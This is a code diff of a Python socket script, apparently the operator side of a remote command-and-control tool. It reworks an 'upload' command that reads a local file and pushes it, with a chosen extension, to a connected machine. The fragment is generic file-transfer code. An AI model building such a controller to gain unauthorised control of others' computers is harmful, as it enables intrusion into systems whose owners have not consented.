@@ -93,34 +93,33 @@ def SendOrders(Con):
                 print(" - Error 1 , Something Is Wrong")
                 continue
 
-        elif(Command == 'upload'): 
-
+        elif(Command == 'upload'):
+        	
             try:
-		
+                    
+                try:
+                    Up = input(" - File Path -> ")
+                    with open(Up, "rb") as F:
+                        Data = F.read() # Read File Bytes
+                except:
+                    print(" - File Error")
+                    continue
+
                 Con.send(str.encode(Command)) # Send Command
-
+                
                 Recv = Con.recv(1024)
-
+                
                 Recv = Recv.decode("utf-8")
 
-                Up = input(" - File Path -> ")
-
                 if(Recv == "file"):
+                        User = input(" - File Extension -> ")
+                        Con.send(str.encode(User))
 
-                    User = input(" - File Extension -> ")
-
-                    Con.send(str.encode(User)) 
-
-                with open(Up, "rb") as F:
-
-                    Data = F.read() # Read File Bytes
-
-                    Con.sendall(Data) # Send the File
-
-                F.close() # Close The File
-
-                print(" - Done")
-                
+                        Con.sendall(Data) # Send the File
+                        F.close() # Close The File
+                        
+                        print(" - Done")
+                        
             except:
 
                 print(" - Error 2 , Something Is Wrong")
